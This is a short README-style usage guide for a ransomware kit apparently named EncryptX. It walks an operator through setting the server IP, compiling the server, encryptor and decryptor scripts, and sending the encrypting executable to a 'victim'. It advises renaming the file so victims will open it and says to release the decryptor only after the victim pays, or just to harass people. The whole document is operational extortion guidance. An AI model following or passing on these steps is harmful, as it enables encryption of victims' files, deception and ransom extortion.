[How.To.Use]

`Goto Encrypt X and change the Socket information 

ip_address = 'YOUR COMPUTERS IPv4 Connection'

To do this open up CMD and type ipconfig and then scroll down till you 
see something that says 

IPv4: 192.168.1.0 or in my case 192.168.1.118 (118) that last number will be different from mine
and copy and paste that into the server.py file the EncryptX.py file 

once youve done that you can change the port if you really want to then go ahead but i would leave it how it is
after that compile server.py encrypt.py and decrypt.py 

after they are all compiled make sure you run the server before sending the target / Victim the EncryptX exe
(!CHANGE THE EncryptX.exe file to something else OTHER WISE THEY PROBS WONT OPEN IT !)

Once the victim as ran the EncryptX.exe file your server terminal should close this means if the Client / Victim 
has ran the exe it will then make a TXT file in the same folder with the key to decrypt thier files and thier desktop name

once they have opend it and youve got the key and they either send yu money for the key to get thier files back 
send them the decrypt.exe with their decrypter code if you are just loking to fuck about with people just do the same thing
send them the decryper.exe along with thier code if thier is any complications using this then please contact me on
